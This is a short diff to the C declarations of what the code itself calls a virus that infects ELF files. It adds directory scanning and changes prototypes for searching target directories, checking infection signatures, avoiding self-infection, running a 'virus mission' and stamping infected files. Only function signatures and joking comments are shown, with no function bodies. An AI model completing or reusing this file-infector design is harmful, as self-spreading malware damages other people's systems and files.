@@ -18,6 +18,7 @@
 #include <sys/wait.h> //The <sys/wait.h> header shall define the symbolic constants for use with waitpid()
 #include <sys/time.h> //The <sys/stat.h> header shall define the structure of the data returned by the fstat(), lstat(), and stat() functions.
 #include <stdbool.h>
+#include <dirent.h>
 
 
 long what_is_the_file_length(char *file_name);
@@ -28,8 +29,8 @@ long what_is_the_file_length(char *file_name);
 int verify_is_elf(char *file_name);
 
 int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_signature);
-int verify_is_original_file(char * file_name); // do not infect oneself :)
-char *search_for_target(char *virus_signature, long length_of_signature);
+int verify_is_original_file(char * file_name, char *virus_file_name); // do not infect oneself, where is the pleasure... :)
+char *search_for_target(char *path_to_target_directory, char *virus_file_name, char *virus_signature, long length_of_signature);
 void execute_virus_mission();
 void stamp_the_infected_file(char *file_name, char *virus_signature);
 
